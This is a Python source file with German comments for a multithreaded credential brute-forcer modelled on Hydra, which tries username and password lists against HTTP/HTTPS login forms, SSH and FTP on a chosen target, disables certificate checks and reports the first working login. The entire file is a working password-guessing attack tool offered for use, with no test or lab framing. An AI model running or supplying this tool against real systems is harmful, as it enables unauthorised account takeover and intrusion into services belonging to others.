import argparse
import concurrent.futures
import ftplib
import sys
import threading
import paramiko
import requests
import urllib3

# Warnungen bei unsicheren HTTPS-Zertifikaten unterdrücken
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Threadsichere Sperre für die Konsolenausgabe
print_lock = threading.Lock()
found_event = threading.Event()


def test_http(target, username, password, is_https=False):
  proto = "https" if is_https else "http"
  url = f"{proto}://{target}"
  data = {"username": username, "password": password}  # Ggf. anpassen!
  try:
    response = requests.post(url, data=data, timeout=5, verify=False)
    if "Invalid" not in response.text and response.status_code == 200:
      return True
  except Exception:
    pass
  return False


def test_ssh(target, username, password):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    ssh.connect(
        target,
        username=username,
        password=password,
        timeout=3,
        banner_timeout=3,
    )
    ssh.close()
    return True
  except Exception:
    return False


def test_ftp(target, username, password):
  try:
    ftp = ftplib.FTP(timeout=3)
    ftp.connect(target, 21)
    ftp.login(username, password)
    ftp.quit()
    return True
  except Exception:
    return False


def worker(target, proto, username, password):
  # Wenn bereits ein Treffer gefunden wurde, abbrechen
  if found_event.is_set():
    return

  success = False
  if proto == "http":
    success = test_http(target, username, password, is_https=False)
  elif proto == "https":
    success = test_http(target, username, password, is_https=True)
  elif proto == "ssh":
    success = test_ssh(target, username, password)
  elif proto == "ftp":
    success = test_ftp(target, username, password)

  with print_lock:
    if success:
      print(f"\n[+] TREFFER GEFUNDEN! Benutzer: {username} | Passwort: {password}")
      found_event.set()
    else:
      # Zeigt den aktuellen Testversuch in der gleichen Zeile an
      print(f"[-] Getestet [{username}]: {password}               ", end="\r")


def main():
  parser = argparse.ArgumentParser(
      description="Erweitertes Mini-Hydra in Python mit Multithreading."
  )
  parser.add_argument(
      "-t", "--target", required=True, help="Ziel-IP oder Domain"
  )
  parser.add_argument(
      "-p",
      "--proto",
      required=True,
      choices=["http", "https", "ssh", "ftp"],
      help="Protokoll",
  )
  parser.add_argument(
      "-u", "--user", help="Einzelner Benutzername (optional, falls keine -U)"
  )
  parser.add_argument(
      "-U", "--userlist", help="Pfad zur Benutzer-Liste (TXT) (optional)"
  )
  parser.add_argument(
      "-l", "--list", required=True, help="Pfad zur Passwort-Liste (TXT)"
  )
  parser.add_argument(
      "-T",
      "--threads",
      type=int,
      default=10,
      help="Anzahl gleichzeitiger Threads (Standard: 10)",
  )

  args = parser.parse_args()

  # Benutzer zusammenstellen (entweder einzeln oder aus Liste)
  users = []
  if args.user:
    users.append(args.user)
  if args.userlist:
    try:
      with open(args.userlist, "r", encoding="utf-8", errors="ignore") as f:
        users.extend([line.strip() for line in f if line.strip()])
    except FileNotFoundError:
      print(f"[-] Fehler: Benutzer-Datei '{args.userlist}' nicht gefunden.")
      sys.exit(1)

  if not users:
    print(
        "[-] Fehler: Du musst entweder einen Benutzer (-u) oder eine"
        " Benutzerliste (-U) angeben."
    )
    sys.exit(1)

  # Passwort-Datei einlesen
  try:
    with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
      passwords = [line.strip() for line in f if line.strip()]
  except FileNotFoundError:
    print(f"[-] Fehler: Passwort-Datei '{args.list}' nicht gefunden.")
    sys.exit(1)

  print(
      f"[*] Starte Brute-Force auf {args.target} ({args.proto.upper()}) mit"
      f" {len(users)} User(n) und {len(passwords)} Passwörtern"
      f" ({args.threads} Threads)..."
  )

  # Multithreading-Ausführung starten
  with concurrent.futures.ThreadPoolExecutor(
      max_workers=args.threads
  ) as executor:
    futures = []
    for user in users:
      for pwd in passwords:
        if found_event.is_set():
          break
        futures.append(
            executor.submit(worker, args.target, args.proto, user, pwd)
        )

    for future in concurrent.futures.as_completed(futures):
      if found_event.is_set():
        break

  if not found_event.is_set():
    print("\n[-] Kein gültiges Passwort in der Liste gefunden.")
  else:
    sys.exit(0)


if __name__ == "__main__":
  main()